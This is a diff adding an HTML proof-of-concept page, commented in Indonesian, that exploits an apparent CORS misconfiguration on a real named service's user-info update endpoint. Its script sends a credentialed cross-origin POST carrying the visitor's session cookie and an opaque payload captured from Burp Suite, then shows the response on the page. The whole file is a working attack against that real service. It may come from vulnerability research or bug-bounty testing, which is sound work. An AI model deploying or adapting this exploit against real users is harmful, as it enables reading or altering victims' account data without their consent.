@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC Test</title>
+</head>
+<body>
+    <h1>CORS Vulnerability Proof of Concept</h1>
+    <button onclick="exploit()">Klik untuk Ambil Data</button>
+    <p>Hasil Response:</p>
+    <div id="result" style="background: #eee; padding: 10px; word-break: break-all;"></div>
+
+    <script>
+        function exploit() {
+            var xhr = new XMLHttpRequest();
+            var url = "https://id-sg.oppo.com/uc/web/v1/user-info/update-basic-info";
+            
+            xhr.open("POST", url, true);
+            xhr.withCredentials = true; // Kunci untuk membawa session cookie
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    // Jika muncul teks di sini, berarti CORS bocor
+                    document.getElementById("result").innerText = xhr.responseText;
+                    console.log(xhr.responseText);
+                }
+            };
+
+            // Masukkan data request body yang Anda temukan di Burp Suite (Gambar 1 atau 2)
+            var payload = '"H4mCxNgIzhFZiS+YorueYXtYgtl4lt8LabhM3f2btk+f+NExcsTrPxfDsIwAWDLA S8cj2IIiaia6g+ThXeN8sAgIYq6FE3dDUNV7CGW5s/g5hweeEQw0wzqQGDKCaeiXMlhxUD25cQbwHVCKwNzQ/zvGONNhvzzK7ILafJHxKt6w=.QK4TmC0YPKenPUeh01ekQjV7x6hKcGCP/K7/D2kGld1oAkQ3ZK+N2W/KSwznJohXMPymjSd3Di3B1EkaJXXXXzKAWSb6bYkmfqk4QJS7gz50GWqgLIK9t1HyjDQo484OMMH4lRwgPdjaXQdPcS pwe2/dgyeIx6h4SyLjoGQMXI=.NwtMvQ2D3dIe/PE="';
+            
+            xhr.send(payload);
+        }
+    </script>
+</body>
+</html>
